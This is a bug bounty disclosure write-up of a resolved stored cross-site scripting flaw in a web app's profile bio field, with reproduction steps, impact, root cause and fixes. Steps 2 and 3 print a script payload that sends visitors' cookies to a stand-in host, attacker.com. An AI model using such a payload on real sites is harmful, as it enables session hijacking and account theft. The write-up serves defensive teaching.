# Stored XSS — Persistent Script Injection via Profile Bio Field

**Vulnerability Type:** Stored Cross-Site Scripting (XSS)
**Severity:** Medium–High (CVSS 3.1 Score: 6.8)
**Platform:** Bug Bounty (Redacted)
**Status:** Resolved / Disclosed
**Date:** 2024

---

## Summary

A Stored Cross-Site Scripting vulnerability was identified in the user profile "About Me" bio field of a web application. User-supplied input was stored in the database and rendered directly in the browser without HTML encoding or content sanitization. An attacker could inject a malicious script payload that would execute in the browser of any user who visited the affected profile page, potentially leading to session hijacking, credential theft, or malicious redirects.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | Stored XSS |
| Injection Point | `POST /api/v1/profile/update` — `bio` parameter |
| Execution Context | Profile page rendered to all visitors |
| Authentication Required | Yes (to inject) / No (to trigger) |
| Affected Users | Any user who views the attacker's profile |
| CVSS Vector | AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N |

---

## Steps to Reproduce

### 1. Navigate to the profile edit page

Log into the application and open the profile settings. Locate the "About Me" or "Bio" text field.

### 2. Inject the XSS payload

Enter the following payload into the bio field and save the profile:

```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

The application accepted the input without any validation error.

### 3. Intercept and confirm with Burp Suite

Capturing the save request in Burp Suite showed the payload was submitted as plain text with no encoding:

```
POST /api/v1/profile/update HTTP/1.1
Host: redacted.com
Content-Type: application/json

{
  "name": "Danish Abbas",
  "bio": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>"
}
```

The server returned `200 OK` with no sanitization applied.

### 4. Visit the profile page as a different user

Open the profile page in a second browser (or incognito window) with a different account. The script executes automatically upon page load.

**Result:** The victim's session cookies are sent to the attacker-controlled server in the URL parameter.

### 5. Safe proof-of-concept payload (used for reporting)

To demonstrate the issue without harvesting data, I used a benign alert payload:

```html
<script>alert('XSS-PoC-DanishAbbas')</script>
```

The alert fired immediately on page load for any visitor.

**Screenshot of PoC:**
> `[alert box displaying: XSS-PoC-DanishAbbas]`

---

## Impact

- **Session Hijacking** — An attacker can steal session cookies and take over victim accounts
- **Credential Phishing** — Inject fake login modals to harvest credentials
- **Malicious Redirects** — Redirect victims to phishing or malware-hosting pages
- **Defacement** — Modify visible page content for any visitor
- **Worm Potential** — If the bio is auto-displayed in feeds, the payload could propagate to many users

---

## Root Cause

The application stored raw user input without sanitization and rendered it directly into the HTML DOM without output encoding. The server-side likely inserted the value as:

```html
<!-- Vulnerable server-side rendering -->
<p class="bio">{{ user.bio | raw }}</p>
```

Using the `raw` filter (or equivalent) disabled HTML escaping, allowing injected tags to render as executable HTML.

---

## Remediation

1. **Output encoding** — Encode all user-supplied content before rendering in HTML contexts. Replace `<` with `&lt;`, `>` with `&gt;`, `"` with `&quot;`, etc.
2. **Input validation** — Reject or strip HTML tags from fields that do not require rich text.
3. **Content Security Policy (CSP)** — Implement a strict CSP header to block inline script execution: `Content-Security-Policy: script-src 'self'`
4. **Use a sanitization library** — For fields requiring rich text (bold, links), use a well-maintained library such as DOMPurify on the client side and a server-side equivalent.
5. **HTTPOnly cookies** — Mark session cookies as `HttpOnly` to prevent JavaScript access even if XSS is triggered.

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [OWASP Top 10 — A03: Injection](https://owasp.org/Top10/A03_2021-Injection/)

---

*This writeup is published for educational purposes. All testing was performed within an authorized bug bounty program scope. The safe alert-based PoC was used exclusively during reporting.*
